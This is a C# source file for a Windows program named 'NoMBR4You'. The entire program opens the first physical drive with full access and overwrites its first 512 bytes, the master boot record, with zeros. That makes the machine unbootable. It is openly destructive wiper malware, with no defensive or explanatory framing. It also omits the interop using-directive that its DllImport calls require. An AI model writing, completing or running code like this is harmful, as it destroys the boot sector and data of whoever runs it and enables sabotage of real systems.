using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace NoMBR4You
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            byte[] newData = new byte[512];

            IntPtr mbrPointer = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x1 | (uint)0x2, z, 0x3, 0, z);

            WriteFile(mbrPointer, newData, 512, out uint lpNumberOfBytesWritten, z);
        }
        private static readonly IntPtr z = IntPtr.Zero;
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    }
}
